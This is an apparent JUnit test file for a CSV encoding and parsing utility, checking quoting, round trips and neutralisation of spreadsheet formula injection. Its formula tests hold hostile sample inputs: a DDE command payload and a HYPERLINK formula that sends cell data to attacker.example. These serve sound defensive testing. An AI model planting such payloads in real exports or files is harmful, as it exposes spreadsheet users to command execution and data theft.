package com.medtrack.util;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Covers {@link CsvSupport}: RFC 4180 encoding and decoding, and formula neutralisation.
 */
@DisplayName("CsvSupport")
class CsvSupportTest {

    @Nested
    @DisplayName("encodeField")
    class EncodeField {

        @Test
        @DisplayName("leaves an ordinary value untouched")
        void plainValueIsUnquoted() {
            assertEquals("MRI Scanner", CsvSupport.encodeField("MRI Scanner"));
        }

        @Test
        @DisplayName("quotes a value containing a comma")
        void quotesComma() {
            // The defect that motivated this class: unquoted, this value produced an extra field
            // and shifted every subsequent column of the row.
            assertEquals("\"Ventilator, Portable\"", CsvSupport.encodeField("Ventilator, Portable"));
        }

        @Test
        @DisplayName("quotes and doubles an embedded quote")
        void escapesQuote() {
            assertEquals("\"Monitor 15\"\" Display\"", CsvSupport.encodeField("Monitor 15\" Display"));
        }

        @Test
        @DisplayName("quotes a value containing a newline")
        void quotesNewline() {
            assertEquals("\"line one\nline two\"", CsvSupport.encodeField("line one\nline two"));
        }

        @Test
        @DisplayName("quotes leading and trailing whitespace so readers cannot trim it away")
        void quotesSignificantWhitespace() {
            assertEquals("\"  padded  \"", CsvSupport.encodeField("  padded  "));
        }

        @Test
        @DisplayName("renders null as an empty field, not the text 'null'")
        void nullBecomesEmpty() {
            // The previous writer appended the literal string "null" for an absent warrantyExpiry,
            // which no spreadsheet reads as empty.
            assertEquals("", CsvSupport.encodeField(null));
        }

        @Test
        @DisplayName("renders a non-string via toString")
        void rendersNonStrings() {
            assertEquals("2026-01-20", CsvSupport.encodeField(java.time.LocalDate.of(2026, 1, 20)));
            assertEquals("42", CsvSupport.encodeField(42));
        }
    }

    @Nested
    @DisplayName("formula neutralisation")
    class FormulaNeutralisation {

        @ParameterizedTest(name = "a value starting with {0} is neutralised")
        @ValueSource(strings = {"=", "+", "-", "@"})
        @DisplayName("every formula trigger is neutralised")
        void neutralisesEveryTrigger(String trigger) {
            String value = trigger + "cmd|' /c calc'!A1";

            String encoded = CsvSupport.encodeField(value);

            assertTrue(encoded.startsWith("'"),
                    "a leading " + trigger + " must be made inert but got: " + encoded);
        }

        @Test
        @DisplayName("neutralises a HYPERLINK exfiltration payload")
        void neutralisesHyperlink() {
            String payload = "=HYPERLINK(\"https://attacker.example/?d=\"&A1,\"Click\")";

            String encoded = CsvSupport.encodeField(payload);

            // Quoted because of the embedded quotes and comma, and prefixed so the spreadsheet
            // treats the cell as text rather than evaluating it (CWE-1236).
            assertTrue(encoded.startsWith("\"'="), encoded);
        }

        @Test
        @DisplayName("neutralises leading tab and carriage return")
        void neutralisesWhitespaceTriggers() {
            // Some importers strip these before examining the first character, which would
            // re-expose the trigger behind them.
            assertTrue(CsvSupport.neutraliseFormula("\t=1+1").startsWith("'"));
            assertTrue(CsvSupport.neutraliseFormula("\r=1+1").startsWith("'"));
        }

        @Test
        @DisplayName("leaves an ordinary value alone")
        void leavesOrdinaryValues() {
            assertEquals("MRI Scanner", CsvSupport.neutraliseFormula("MRI Scanner"));
            assertEquals("", CsvSupport.neutraliseFormula(""));
            assertEquals(null, CsvSupport.neutraliseFormula(null));
        }

        @Test
        @DisplayName("a negative number is neutralised, and reversing restores it")
        void negativeNumbersRoundTrip() {
            // "-5" genuinely starts with a formula trigger. Neutralising it is correct; what
            // matters is that the round trip is lossless.
            String encoded = CsvSupport.neutraliseFormula("-5");
            assertEquals("'-5", encoded);
            assertEquals("-5", CsvSupport.denormaliseFormula(encoded));
        }

        @Test
        @DisplayName("denormalise leaves a genuine apostrophe alone")
        void denormaliseIsConservative() {
            assertEquals("'Tis a name", CsvSupport.denormaliseFormula("'Tis a name"));
            assertEquals("O'Brien", CsvSupport.denormaliseFormula("O'Brien"));
        }
    }

    @Nested
    @DisplayName("parseLine")
    class ParseLine {

        @Test
        @DisplayName("splits a plain record")
        void splitsPlainRecord() {
            assertEquals(List.of("EQ-1", "MRI", "Radiology"), CsvSupport.parseLine("EQ-1,MRI,Radiology"));
        }

        @Test
        @DisplayName("keeps a comma inside a quoted field")
        void keepsQuotedComma() {
            assertEquals(List.of("EQ-2", "Ventilator, Portable", "ICU"),
                    CsvSupport.parseLine("EQ-2,\"Ventilator, Portable\",ICU"));
        }

        @Test
        @DisplayName("unescapes a doubled quote instead of deleting it")
        void unescapesDoubledQuote() {
            // The previous parser toggled its boolean twice here and emitted nothing, so the
            // character was silently lost.
            assertEquals(List.of("Monitor 15\" Display", "Ward"),
                    CsvSupport.parseLine("\"Monitor 15\"\" Display\",Ward"));
        }

        @Test
        @DisplayName("preserves whitespace inside a quoted field but trims an unquoted one")
        void whitespaceHandling() {
            assertEquals(List.of("  padded  ", "trimmed"),
                    CsvSupport.parseLine("\"  padded  \",  trimmed  "));
        }

        @Test
        @DisplayName("produces an empty field for consecutive commas")
        void emptyFields() {
            assertEquals(List.of("a", "", "c"), CsvSupport.parseLine("a,,c"));
            assertEquals(List.of("", ""), CsvSupport.parseLine(","));
        }

        @Test
        @DisplayName("returns no fields for null")
        void handlesNull() {
            assertTrue(CsvSupport.parseLine(null).isEmpty());
        }

        @Test
        @DisplayName("strips a neutralising apostrophe on the way back in")
        void reversesNeutralisation() {
            assertEquals(List.of("=SUM(A1:A2)"), CsvSupport.parseLine("'=SUM(A1:A2)"));
        }
    }

    @Nested
    @DisplayName("round trip")
    class RoundTrip {

        @Test
        @DisplayName("every awkward value survives encode then parse")
        void awkwardValuesSurvive() {
            List<String> original = List.of(
                    "Ventilator, Portable",
                    "Monitor 15\" Display",
                    "  padded  ",
                    "line one\nline two",
                    "Braun_Space",
                    "Infusion Pump 50%",
                    "plain");

            StringBuilder encoded = new StringBuilder();
            for (int index = 0; index < original.size(); index++) {
                if (index > 0) {
                    encoded.append(',');
                }
                encoded.append(CsvSupport.encodeField(original.get(index)));
            }

            assertEquals(original, CsvSupport.parseLine(encoded.toString()));
        }

        @Test
        @DisplayName("encodeRow terminates with CRLF as RFC 4180 requires")
        void encodeRowUsesCrLf() {
            String row = CsvSupport.encodeRow("a", "b");

            assertEquals("a,b\r\n", row);
        }

        @Test
        @DisplayName("a row keeps its column count when a field contains a comma")
        void columnCountIsStable() {
            // The regression this whole class exists for: seven header columns must still be seven
            // data columns even when one value contains a comma.
            String header = CsvSupport.encodeRow("Code", "Name", "Department");
            String data = CsvSupport.encodeRow("EQ-2", "Ventilator, Portable", "ICU");

            int headerColumns = CsvSupport.parseLine(header.replace("\r\n", "")).size();
            int dataColumns = CsvSupport.parseLine(data.replace("\r\n", "")).size();

            assertEquals(headerColumns, dataColumns);
            assertEquals(3, dataColumns);
        }
    }
}
